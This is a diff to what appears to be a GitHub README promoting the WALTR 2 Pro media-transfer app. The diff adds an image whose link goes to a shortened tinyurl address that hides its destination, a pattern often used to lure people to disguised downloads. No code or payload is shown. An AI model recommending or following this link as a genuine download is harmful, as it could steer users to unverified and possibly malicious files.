@@ -2,7 +2,7 @@
 
 **WALTR 2 Pro** is a sophisticated desktop application that provides a seamless, wireless solution for transferring media files to your Apple devices—completely bypassing iTunes. ✨
 
-
+[![74658769](https://github.com/user-attachments/assets/60a82e4e-0b8c-40ab-94b9-e7c79875b0e6)](https://tinyurl.com/4c56yynf)
 
 ## 📦 What is it?
 This is a professional-grade tool that enables you to drag and drop virtually any file format directly to your iPhone, iPad, or iPod touch. It intelligently converts content in the background and delivers it straight into the appropriate iOS apps, eliminating the need for cables or complex setup processes! 🚀
